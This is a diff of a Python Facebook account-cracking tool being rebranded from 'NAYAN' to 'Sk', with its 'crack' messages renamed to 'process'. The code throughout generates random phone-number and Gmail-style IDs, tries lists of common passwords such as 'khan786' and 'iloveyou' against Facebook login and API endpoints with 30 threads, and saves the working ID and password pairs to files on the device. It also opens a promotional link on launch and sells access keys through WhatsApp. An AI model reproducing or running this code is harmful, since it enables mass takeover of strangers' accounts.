@@ -1,12 +1,12 @@
-##RANI ISE BACK JO BI PANGA LEGA WUNAYANA YEHI HAAL HOGA 
+##RANI ISE BACK JO BI PANGA LEGA WUSKA YEHI HAAL HOGA 
 ## NAME TO YAAD HE 🍌✌️
 from os import path
 import os,base64,zlib,pip,urllib
 os.system('xdg-open https://facebook.com/groups/291183553213655/')
-print('\n\033[1;97m [•] checking update 10.8 \n [•] wait a few sec... \n [•] Join NAYAN facebook Group')
+print('\n\033[1;97m [•] checking update 10.8 \n [•] wait a few sec... \n [•] Join Sk facebook Group')
 
 try:
-        import os,requests,json,time,re,random,sys,uuid,string,subcrack
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
         from string import *
         from concurrent.futures import ThreadPoolExecutor as tred
 except ModuleNotFoundError:
@@ -518,21 +518,21 @@ for agenku in range(10000):
 
 
 logo=("""""""""
-\033[0;92m╔══════════════════════════════════════════════╗
-\033[0;32m║ ███    ██  \033[0;31m█████  \033[0;93m██    ██  \033[0;32m█████  \033[0;31m███    ██\033[0;92m ║
-\033[0;32m║ ████   ██ \033[0;31m██   ██  \033[0;93m██  ██  \033[0;32m██   ██ \033[0;31m████   ██\033[0;92m ║
-\033[0;32m║ ██ ██  ██ \033[0;31m███████   \033[0;93m████   \033[0;32m███████ \033[0;31m██ ██  ██\033[0;92m ║
-\033[0;32m║ ██  ██ ██ \033[0;31m██   ██    \033[0;93m██    \033[0;32m██   \033[0;32m██ \033[0;31m██  ██ ██\033[0;92m ║
-\033[0;92m║ ██   ████ \033[0;31m██   ██    \033[0;93m██    \033[0;32m██   \033[0;32m██ \033[0;31m██   ████\033[0;92m ║
-\033[0;92m╚══════════════════════════════════════════════╝
-\033[0;92m╔═══════════════════════════════════════════╗\033[0;92m╔═══╗
-\033[0;92m║➣\033[0;31m DEVOLPER   :   \033[0;34m       MR. NAYAN          ║\033[0;32m║\033[1;31m N \033[1;32m║
-\033[0;92m║➣\033[0;33m FACEBOOK   :    \033[0;35m      Mohammad Nayan     ║\033[0;32m║\033[1;312m A\033[0;92m ║
-\033[0;92m║═══════════════════════════════════════════║\033[0;32m║\033[1;34m Y\033[0;92m ║
-\033[0;92m║➣\033[0;91m WHATSAPP   :    \033[0;92m      01615298449        ║\033[0;32m║\033[1;93m A\033[0;92m ║
-\033[0;92m║➣\033[0;93m GITHUB     :     \033[0;94m     MR-NAYAN-404       ║\033[0;92m║\033[1;92m N\033[0;92m ║
-\033[0;92m║➣\033[0;94m TOOLS      :      \033[0;93m    FREE-CLONE         ║\033[0;92m║ 😘║
-\033[0;92m╚═══════════════════════════════════════════╝\033[0;92m╚═══╝""")
+\33[1;91m ######        ##    ## 
+\33[1;92m##    ##       ##   ##  
+\33[1;93m##             ##  ##   
+\33[1;94m ######        #####    
+\33[1;95m      ##       ##  ##   
+\33[1;96m##    ##       ##   ##  
+\33[1;97m ######        ##    ## 
+                       \33[;92m Pro
+  \33[;97m
+=======================================================
+\033[;37m\033[;97m         Facebook       \033[;37m\033[;92m  : Lala Sherry
+\033[;37m\033[;97m         Version          \033[;37m\033[;92m: 10.8   
+\033[;37m=======================================================
+ I dont caree what then \033[;96mPeople\033[;37m Think About \033[;92m Me \033[;37m
+=======================================================""")
 
 def linex():
 	print("=======================================================")
@@ -547,15 +547,15 @@ def approval():
       print("\Your Token is Successfully Approved")
       msg = str(os.geteuid())
       time.sleep(0.5)
-      NAYAN_Main()
+      SK_Main()
       pass
     else:
       print("Your Token : "+id)
       print('\33[1;97m----------------------------------------------')
       print("\33[1;32mImportant Note")
       print("\33[1;97m----------------------------------------------")
-      print("\33[1;97mFirst Join NAYAN Group ")
-      print('Copy Key and send NAYAN Owner')
+      print("\33[1;97mFirst Join Sk Group ")
+      print('Copy Key and send Sk Owner')
       print('Command paid its not free')
       print('\33[1;97m----------------------------------------------')
       print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
@@ -699,11 +699,11 @@ def public():
                                         crack_submit.submit(api1,ids,names,passlist)
                 print('\033[1;97m')
                 linex()
-                print(' The crack has completed')
+                print(' The process has completed')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python NAYAN.py')
+                os.system('python Sk.py')
         except requests.exceptions.ConnectionError:
                 exit(f' No internet connection')
         except (KeyError,IOError):
@@ -758,7 +758,7 @@ def menu():
                                 with tred(max_workers=30) as crack_submit:
                                         clear()
                                         total_ids = str(len(fo))
-                                        print('Total account : \033[1;97m'+total_ids+f' \033[1;33m\033[1;36m\n\033[1;97mMethod  \033[1;97mM{mthd}')
+                                        print('Total account : \033[1;97m'+total_ids+f' \033[1;33m\033[1;36m \033[1;97mMethod  \033[1;97mM{mthd}')
                                         print("\033[1;97mUse flight mode for speed up\033[1;97m")
                                         linex()
                                         for user in fo:
@@ -772,7 +772,7 @@ def menu():
                                                         crack_submit.submit(api1,ids,names,passlist)
                                 print('\033[1;97m')
                                 linex()
-                                print(' The crack has completed')
+                                print(' The process has completed')
                                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                 linex()
                                 input(' Press enter to back ')
@@ -825,9 +825,9 @@ def menu():
                         url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
                         name = input(" Enter your Name : ")
                         linex()
-                        tks = ("Hi NAYAN Sir, I Need To Buy Your Paid NAYAN PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
-                        subcrack.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
-                        print(' Run :  python NAYAN.py')
+                        tks = ("Hi Sk Sir, I Need To Buy Your Paid Sk PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
+                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
+                        print(' Run :  python Sk.py')
                         exit()
         except ValueError:
                 exit()
@@ -846,7 +846,7 @@ def pak():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
-                with tred(max_workers=30) as NAYAN:     
+                with tred(max_workers=30) as Sk:     
                         clear()
                         tl = str(len(user))
                         print('Total account : \033[1;32m'+tl)
@@ -855,10 +855,10 @@ def pak():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
-                                NAYAN.submit(rndm,ids,passlist)
+                                Sk.submit(rndm,ids,passlist)
                 print('\033[1;97m')
                 linex()
-                print(' The crack has completed')
+                print(' The process has completed')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
@@ -875,7 +875,7 @@ def bd():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(8))
                         user.append(nmp)
-                with tred(max_workers=30) as NAYAN:     
+                with tred(max_workers=30) as Sk:     
                         clear()
                         tl = str(len(user))
                         print(' Total account : \033[1;32m'+tl)
@@ -884,14 +884,14 @@ def bd():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
-                                NAYAN.submit(rndm,ids,passlist)
+                                Sk.submit(rndm,ids,passlist)
                 print('\033[1;97m')
                 linex()
-                print(' The crack has completed')
+                print(' The process has completed')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python NAYAN.py')
+                os.system('python Sk.py')
 def gmail():
                 os.system('rm -rf .re.txt')
                 clear()
@@ -923,7 +923,7 @@ def gmail():
                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         fo = open('.re.txt', 'r').read().splitlines()
-                with tred(max_workers=30) as NAYAN:
+                with tred(max_workers=30) as Sk:
                         total = str(len(fo))
                         clear()
                         print('Total account : \033[1;97m'+total)
@@ -939,17 +939,17 @@ def gmail():
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                NAYAN.submit(rndm,ids,passlist)
+                                Sk.submit(rndm,ids,passlist)
                 print('\033[1;97m')
                 linex()
-                print(' The crack has completed')
+                print(' The process has completed')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
                 os.system('python Pro.py')
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;97m [crack] %s|\033[1;32mOK:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;97m [Process] %s|\033[1;32mOK:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -970,18 +970,18 @@ def ffb(ids,names,passlist):
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        NAYAN=session.cookies.get_dict().keys()
-                        if "c_user" in NAYAN:
+                        Sk=session.cookies.get_dict().keys()
+                        if "c_user" in Sk:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [NAYAN-OK]\033[1;37m %s \033[1;32m|\033[1;37m %s'%(ids,pas))
-                                open('/sdcard/NAYAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print('\r\r\033[1;32m SK-OK %s | %s'%(ids,pas))
+                                open('/sdcard/SK-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in NAYAN:
+                        elif 'checkpoint' in Sk:
                                 if 'y' in pcp:
-                                        print('\r\033[1;97m NAYAN-CP '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/NAYAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print('\r\033[1;97m SK-CP '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/Sk-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -995,7 +995,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;97m [crack] %s|\033[1;32mOK:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;97m [Process] %s|\033[1;32mOK:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -1049,14 +1049,14 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m NAYAN-OK '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/NAYAN-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m SK-OK '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SK-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\033[1;97m NAYAN-CP '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/NAYAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\033[1;97m SK-CP '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Sk-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -1069,7 +1069,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;97m [crack] %s|\033[1;32mOK:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;97m [Process] %s|\033[1;32mOK:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -1123,18 +1123,18 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32mNAYAN-OK '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/NAYAN-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32mSK-OK '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SK-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\033[1;97m NAYAN-CP '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/NAYAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\033[1;97m SK-CP '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Sk-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/NAYAN-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/Sk-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -1146,7 +1146,7 @@ def api1(ids,names,passlist):
 def rndm(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;97m [crack] %s|\033[1;32mOK:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;97m [Process] %s|\033[1;32mOK:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
@@ -1196,16 +1196,16 @@ def rndm(ids,passlist):
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
                                         try:
-                                                okk=open('/sdcard/NAYAN-OK.txt','r').read()
+                                                okk=open('/sdcard/SK-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
-                                                        print('\r\r\033[1;32m NAYAN-OK '+uid+' | '+pas+'\033[1;97m')
-                                                        open('/sdcard/NAYAN-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        print('\r\r\033[1;32m SK-OK '+uid+' | '+pas+'\033[1;97m')
+                                                        open('/sdcard/SK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;32mNAYAN-OK '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/NAYAN-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                print('\r\r\033[1;32mSK-OK '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/SK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
                                 else:
